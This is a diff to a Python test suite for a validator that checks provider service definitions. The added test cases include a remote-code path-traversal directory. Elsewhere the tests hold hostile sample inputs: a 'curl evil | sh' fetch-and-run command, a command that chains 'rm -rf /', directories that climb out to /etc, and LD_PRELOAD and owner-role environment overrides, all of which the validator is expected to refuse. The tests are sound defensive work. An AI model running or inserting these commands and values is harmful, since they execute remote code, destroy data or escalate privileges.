@@ -24,7 +24,9 @@ ok = {"provider": "belief-corroboration", "service": "python3 -m belief_corrobor
 check(refusal(ok) is None, "a provider's service, directory and settings: run")
 check(refusal({**ok, "service": "sh -c 'curl evil | sh'"}) and refusal({**ok, "service": "python3 -m x; rm -rf /"}),
       "any other command is refused")
-check(refusal({**ok, "cwd": "../.."}) and refusal({**ok, "cwd": "kernel/providers/../../etc"}), "a directory outside the providers is refused")
+check(refusal({**ok, "cwd": "../.."}) and refusal({**ok, "cwd": "kernel/providers/../../etc"})
+      and refusal({**ok, "cwd": "experiments/x123/../../.."}), "a directory outside the providers is refused")
+check(refusal({**ok, "cwd": "experiments/x0123456789ab/anomaly-recent"}) is None, "a candidate in an experiment: run")
 check(refusal({**ok, "env": {"DATABASE_URL": "x"}}) and refusal({**ok, "env": {"LD_PRELOAD": "x"}})
       and refusal({**ok, "env": {"KK_ROLE": "kk_owner"}}), "identity, login and loader variables cannot come from intent")
 
@@ -36,7 +38,7 @@ g("init", "-q")
 g("add", "-A")
 g("commit", "-qm", "intent")
 want, refused = desired(intent, "sandbox")
-check(set(want) == {"belief-corroboration", "validator-shacl"} and not refused, "the committed sandbox intent: both providers")
+check(set(want) == {"anomaly", "belief-corroboration", "validator-shacl"} and not refused, "the committed sandbox intent: its three providers")
 f = intent / "environments" / "sandbox" / "belief-corroboration.yaml"
 f.write_text(f.read_text().replace('KK_POLL_SECONDS: "1"', 'KK_POLL_SECONDS: "9"'))
 (intent / "environments" / "sandbox" / "extra.yaml").write_text("service: python3 -m evil\ncwd: kernel/providers/evil\n")
